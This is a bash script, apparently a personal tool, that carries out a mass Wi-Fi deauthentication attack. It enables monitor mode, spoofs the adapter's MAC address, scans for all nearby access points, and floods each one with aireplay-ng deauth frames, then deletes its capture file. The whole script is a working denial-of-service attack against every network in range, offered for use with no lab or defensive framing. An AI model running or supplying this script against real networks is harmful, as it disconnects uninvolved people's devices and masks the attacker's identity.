#!/bin/bash
#Creator: David Parra-Sandoval
#Date: 3/26/2020 time: 5:06PM
#Last Modified Date: 5/18/2020
clear

echo "MASS deauthentication attack"
if [[ ${UID} -ne 0 ]]; then
echo "Please run as root or sudo"
exit 1
else echo -e "\t\t\tWelcome $USER"
echo "Script will deauthenticate all captured BSSID's with clients using -D"
echo "all this script needs is a deauth count, everything else is automated"
sleep 4
fi
echo 

read -p "Deauthentication count:" COUNT

wifi=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo airmon-ng start $wifi 
clear

wlan0=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo ip link set $wlan0 down && sudo macchanger -A $wlan0 && sudo ip link set $wlan0 up
sleep 1
clear

exec xterm -iconic -e sudo airodump-ng --output-format kismet -w KISMET $wlan0 &

time=30
until [[ $time = 0 ]]; do
echo -e -n "$time\\"
time=$(($time-1))
sleep 1
done

kill $!

if [[ $? = 0 ]]; then
echo -e "\tGET READY!......"; sleep 3
fi

BSSIDS=$(cat KISMET-01.kismet.csv | awk -F ";" '{print $4}' | tail +2)

for MAC in $BSSIDS; do
sudo aireplay-ng --deauth $COUNT -D -a $MAC $wlan0 
done

rm KISMET-01.kismet.csv
sudo airmon-ng stop $wlan0
sudo ip link set $wifi down && sudo ip link set $wifi up
clear
